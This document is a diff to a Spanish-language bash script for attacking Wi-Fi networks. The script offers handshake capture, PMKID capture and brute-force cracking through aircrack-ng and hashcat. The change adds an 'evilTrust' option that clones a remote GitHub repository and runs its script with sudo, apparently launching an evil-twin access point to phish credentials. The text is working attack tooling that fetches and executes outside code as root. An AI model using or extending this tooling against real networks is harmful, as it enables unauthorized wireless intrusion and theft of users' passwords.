@@ -14,7 +14,7 @@ cleancolor="echo -e "${endColour}""
 programs() {
 	clear
 	tput civis
-	dependencias=(aircrack-ng macchanger xterm hcxtool hashcat)
+	dependencias=(aircrack-ng macchanger xterm hcxtool hashcat git)
 
 	echo -e "\n${greenColour}[*] Comprobando dependencias necesarias...\n"
 	sleep 1
@@ -25,7 +25,7 @@ programs() {
 		if [ "$(echo $?)" -eq 0 ]; then
 			echo -e "${greenColour}[+] $program listo"
 		else 
-			echo -e "${redColour}[-] $program no instalada"
+			echo -e "${redColour}[-] $program no instalado"
 			echo -e "${blueColour}[*] Instalando ${program}..." 
 			sudo apt-get install $program -y > /dev/null 2>&1
 		fi
@@ -122,6 +122,21 @@ fuerza_ataque() {
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
 
+evil_ataque() {
+	clear; echo -e "\n${grayColour}[*] Iniciando Ataque evilTrust by S4vitar..."
+	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	sudo /etc/init.d/networking start > /dev/null 2>&1
+	sudo /etc/init.d/networking restart > /dev/null 2>&1
+	sudo systemctl start NetworkManager > /dev/null 2>&1
+	ifconfig $tar up > /dev/null 2>&1
+	sleep 7
+	echo -e "${blueColour}\n[*]Clonando el programa..."; git clone https://github.com/Kidd3n/evilTrust.git > /dev/null 2>&1
+	cd evilTrust
+	chmod 755 evilTrust.sh
+	xterm -hold -e "sudo ./evilTrust.sh -m terminal" &
+}
+
+
 salir() {
 	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
 	airmon-ng stop ${tar}mon > /dev/null 2>&1
@@ -186,9 +201,10 @@ else
 							echo -e "${yellowColour}\n1) Ataque Handshake"
 							echo -e "2) Ataque PKMID"
 							echo -e "3) Ataque de fuerza bruta"
-							echo -e "4) Salir"
+							echo -e "4) Ataque evilTrust (S4vitar)"
+							echo -e "5) Salir"
 							tput cnorm
-							echo -e "${greenColour}"; read -p "Seleccione un ataque: " opcion
+							echo -e "${greenColour}"; read -p "[?] Seleccione un ataque: " opcion
 							$cleancolor
 							case $opcion in
 								1)
@@ -201,6 +217,9 @@ else
 								fuerza_ataque
 								;;
 								4)
+								evil_ataque
+								;;
+								5)
 								salir
 								;;
 								*)
